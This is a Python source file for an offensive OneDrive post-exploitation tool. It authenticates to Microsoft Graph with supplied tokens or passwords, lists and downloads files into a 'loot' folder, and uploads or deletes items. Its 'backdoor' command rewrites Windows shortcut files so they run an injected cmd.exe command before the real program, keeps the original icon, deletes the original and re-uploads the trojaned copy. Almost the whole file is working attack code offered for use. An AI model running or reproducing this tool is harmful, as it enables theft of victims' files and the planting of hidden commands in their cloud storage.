import argparse
import os
import shutil
import sys
import win32com.client
import requests
from auth import graph_auth, device_code_auth

def print_folder_contents(items, current_path, has_parent=False):
    print(f"\nContents of {current_path}:")
    print(f"{'Index':<5} {'Name':<60} {'Size':<25} {'Last Accessed/Modified':<25}")
    print("-" * 115)

    if has_parent and current_path != 'root':
        print(f"{0:<5} {'(go back)':<60} {'-':<25} {'-':<25}")
    else:
        print(f"{0:<5} {'(root)':<60} {'-':<25} {'-':<25}")
        
    for i, item in enumerate(items):
        name = item['name'][:60].ljust(60)

        if 'folder' in item:
            size = f"(Folder, {item['folder']['childCount']} items)".ljust(25)
            last_accessed = "-"
        elif 'file' in item:
            size = f"{item['size']} bytes".ljust(25)
            last_accessed = item.get('fileSystemInfo', {}).get('lastAccessedDateTime', None)
            if not last_accessed:
                last_accessed = item.get('fileSystemInfo', {}).get('lastModifiedDateTime', '-')
            if last_accessed != '-':
                last_accessed = last_accessed.replace('T', ' ').split('.')[0]

        index = i + 1
        print(f"{index:<5} {name} {size} {last_accessed:<25}")
    print()

def get_folder_contents(access_token, folder_id=None):
    headers = {
        'Authorization': f'Bearer {access_token}',
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36'
    }

    url = 'https://graph.microsoft.com/v1.0/me/drive/root/children' if folder_id is None else f'https://graph.microsoft.com/v1.0/me/drive/items/{folder_id}/children'
    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        return response.json().get('value', [])
    else:
        print(f"Error {response.status_code}: {response.text}")
        return []

def get_root_folder_id(access_token):
    headers = {
        'Authorization': f'Bearer {access_token}',
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36'
    }

    url = 'https://graph.microsoft.com/v1.0/me/drive/root'
    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        return response.json().get('id', None)
    else:
        print(f"Error {response.status_code}: {response.text}")
        return None

def download_file(access_token, file_id, file_name, download_folder='loot'):
    headers = {
        'Authorization': f'Bearer {access_token}',
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36'
    }

    url = f'https://graph.microsoft.com/v1.0/me/drive/items/{file_id}/content'
    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        os.makedirs(download_folder, exist_ok=True)
        with open(f'{download_folder}/{file_name}', 'wb') as f:
            f.write(response.content)
        print(f"Downloaded {file_name} to {download_folder}")
    else:
        print(f"Error {response.status_code}: {response.text}")

def upload_file(access_token, folder_id, local_file):
    file_name = os.path.basename(local_file)
    headers = {
        'Authorization': f'Bearer {access_token}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        'Content-Type': 'application/octet-stream'
    }

    url = f'https://graph.microsoft.com/v1.0/me/drive/items/{folder_id}:/{file_name}:/content'
    with open(local_file, 'rb') as f:
        response = requests.put(url, headers=headers, data=f)

    if response.status_code in [200, 201]:
        print(f"Uploaded {file_name} to folder ID {folder_id}")
    else:
        print(f"Error {response.status_code}: {response.text}")

def delete_item(access_token, item_id):
    headers = {
        'Authorization': f'Bearer {access_token}',
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36'
    }

    url = f'https://graph.microsoft.com/v1.0/me/drive/items/{item_id}'
    response = requests.delete(url, headers=headers)

    if response.status_code == 204:
        print(f"Item {item_id} deleted successfully.")
    else:
        print(f"Error {response.status_code}: {response.text}")

def modify_shortcut(access_token, file_id, file_name, new_command=None, download_folder='backups', output_folder='backdoored'):
    # Define paths for downloaded and modified files
    downloaded_file_path = os.path.join(download_folder, file_name)
    modified_file_path = os.path.join(output_folder, file_name)
    
    # Ensure the download folder exists
    if not os.path.exists(download_folder):
        os.makedirs(download_folder)
    
    # Download the file
    download_file(access_token, file_id, file_name, download_folder=download_folder)
    
    # Ensure the downloaded file exists
    if not os.path.exists(downloaded_file_path):
        print(f"Error: The file '{downloaded_file_path}' does not exist.")
        sys.exit(1)
    
    # Create the output folder if it doesn't exist
    if not os.path.exists(output_folder):
        os.makedirs(output_folder)
    
    # Copy the downloaded LNK file to the output folder
    try:
        shutil.copy2(downloaded_file_path, modified_file_path)
        print(f"Copied '{downloaded_file_path}' to '{modified_file_path}'")
    except Exception as e:
        print(f"Error copying file: {e}")
        sys.exit(1)
    
    # Create a shell object to interact with the copied LNK file
    shell = win32com.client.Dispatch("WScript.Shell")
    
    # Load the copied shortcut file
    shortcut = shell.CreateShortcut(modified_file_path)
    
    # Retrieve original target, arguments, and icon location
    original_target = shortcut.TargetPath
    original_arguments = shortcut.Arguments
    original_icon = shortcut.IconLocation
    
    # Prompt the user to input the new command without escaping
    if not new_command:
        new_command = input("Enter the new command to be injected (input as a literal, no escaping needed): ")
    
    # Set TargetPath to cmd.exe to run commands via shell
    shortcut.TargetPath = r"C:\Windows\system32\cmd.exe"
    
    # Set Arguments to first run the new command minimized, then the original target and arguments
    dynamic_command = f'{new_command} & start "" "{original_target}" "{original_arguments}"'
    print(f"Setting arguments to: {dynamic_command}")
    shortcut.Arguments = dynamic_command
    
    # Set the IconLocation to the original icon
    shortcut.IconLocation = original_icon
    
    # Set the "Start In" field (WorkingDirectory) to be blank
    shortcut.WorkingDirectory = ""
    
    # Save the modified shortcut
    shortcut.Save()
    print(f"Shortcut '{modified_file_path}' updated successfully with injected command.")
    
    # Optionally delete the original file after modification
    delete_item(access_token, file_id)

def backdoor_file(access_token, file_id, file_name):
    # Ensure the backups and backdoored folders exist
    backup_folder = 'backups'
    backdoored_folder = 'backdoored'
    if not os.path.exists(backup_folder):
        os.makedirs(backup_folder)
    if not os.path.exists(backdoored_folder):
        os.makedirs(backdoored_folder)
    
    # Modify the shortcut and save the modified file in the backdoored folder
    modify_shortcut(access_token, file_id, file_name, output_folder=backdoored_folder)
    
    # Get the root folder ID or appropriate folder ID for uploading
    current_folder_id = get_root_folder_id(access_token)
    
    # Upload the modified file with the same name from the backdoored folder
    upload_file(access_token, current_folder_id, os.path.join(backdoored_folder, file_name))

def main():
    parser = argparse.ArgumentParser(description="OneDrive Enumeration Tool")
    parser.add_argument('--access-token', help='Access token for authentication')
    parser.add_argument('--refresh-token', help='Refresh token for authentication')
    parser.add_argument('--email', help='Email for authentication')
    parser.add_argument('--password', help='Password for authentication')
    parser.add_argument('--tenant-id', help='Tenant ID (optional)')
    parser.add_argument('--devicecode', action='store_true', help='Use device code authentication flow')
    
    args = parser.parse_args()

    if args.devicecode:
        access_token = device_code_auth()
    else:
        access_token = graph_auth(args)

    if not access_token:
        print("[-] Authentication failed. Exiting.")
        return

    folder_id = get_root_folder_id(access_token)
    if not folder_id:
        print("Failed to retrieve the root folder ID.")
        return

    path_stack = ['root']
    parent_folder_ids = []
    current_folder_id = folder_id
    items = get_folder_contents(access_token, current_folder_id)
    current_path = '/'.join(path_stack)

    while True:
        command = input(f"{current_path}> ").strip().split()

        if not command:
            continue

        cmd = command[0].lower()

        if cmd == 'ls':
            items = get_folder_contents(access_token, current_folder_id)
            print_folder_contents(items, current_path, has_parent=len(path_stack) > 1)
        elif cmd == 'cd':
            if len(command) == 2:
                try:
                    choice = int(command[1])
                    if choice == 0 and len(path_stack) > 1:
                        current_folder_id = parent_folder_ids.pop()
                        path_stack.pop()
                        current_path = '/'.join(path_stack)
                        items = get_folder_contents(access_token, current_folder_id)
                        print_folder_contents(items, current_path, has_parent=len(path_stack) > 1)
                    else:
                        selected_item = items[choice - 1]
                        if 'folder' in selected_item:
                            parent_folder_ids.append(current_folder_id)
                            path_stack.append(selected_item['name'])
                            current_folder_id = selected_item['id']
                            current_path = '/'.join(path_stack)
                            items = get_folder_contents(access_token, current_folder_id)
                            print_folder_contents(items, current_path, has_parent=True)
                        else:
                            print("Invalid choice. Please select a folder.")
                except (IndexError, ValueError):
                    print("Invalid choice. Please enter a valid number.")
            else:
                print("Usage: cd <number>")
        elif cmd == 'download':
            if len(command) == 2:
                try:
                    choice = int(command[1])
                    if 1 <= choice <= len(items) + (1 if len(path_stack) > 1 else 0):
                        selected_item = items[choice - 1 - (1 if len(path_stack) > 1 else 0)]
                        if 'file' in selected_item:
                            download_file(access_token, selected_item['id'], selected_item['name'])
                        else:
                            print("Invalid choice. Please select a file.")
                    else:
                        print("Invalid choice. Please enter a valid number.")
                except (IndexError, ValueError):
                    print("Invalid choice. Please enter a valid number.")
            else:
                print("Usage: download <number>")
        elif cmd == 'upload':
            if len(command) == 2:
                local_file = command[1]
                if os.path.isfile(local_file):
                    upload_file(access_token, current_folder_id, local_file)
                else:
                    print("Invalid file path. Please enter a valid file path.")
            else:
                print("Usage: upload <local file>")
        elif cmd == 'delete':
            if len(command) == 2:
                try:
                    choice = int(command[1])
                    if 1 <= choice <= len(items) + (1 if len(path_stack) > 1 else 0):
                        selected_item = items[choice - 1 - (1 if len(path_stack) > 1 else 0)]
                        delete_item(access_token, selected_item['id'])
                    else:
                        print("Invalid choice. Please enter a valid number.")
                except (IndexError, ValueError):
                    print("Invalid choice. Please enter a valid number.")
            else:
                print("Usage: delete <number>")
        elif cmd == 'backdoor':
            if len(command) == 2:
                try:
                    choice = int(command[1])
                    if 1 <= choice <= len(items) + (1 if len(path_stack) > 1 else 0):
                        selected_item = items[choice - 1 - (1 if len(path_stack) > 1 else 0)]
                        if 'file' in selected_item:
                            backdoor_file(access_token, selected_item['id'], selected_item['name'])
                        else:
                            print("Invalid choice. Please select a file.")
                    else:
                        print("Invalid choice. Please enter a valid number.")
                except (IndexError, ValueError):
                    print("Invalid choice. Please enter a valid number.")
            else:
                print("Usage: backdoor <number>")
        elif cmd == 'help':
            print("Supported commands:")
            print("  ls                    - List the contents of the current folder")
            print("  cd <number>           - Change directory to the folder specified by <number>")
            print("  download <number>     - Download the file specified by <number>")
            print("  upload <local file>   - Upload a local file to the current folder")
            print("  delete <number>       - Delete the item specified by <number>")
            print("  backdoor <number>     - Call modify_shortcut with the specified item number")
            print("  help                  - Display this help message")
            print("  exit                  - Exit the program")
        elif cmd == 'exit':
            break
        else:
            print(f"Unknown command: {cmd}. Type 'help' for a list of commands.")

if __name__ == "__main__":
    main()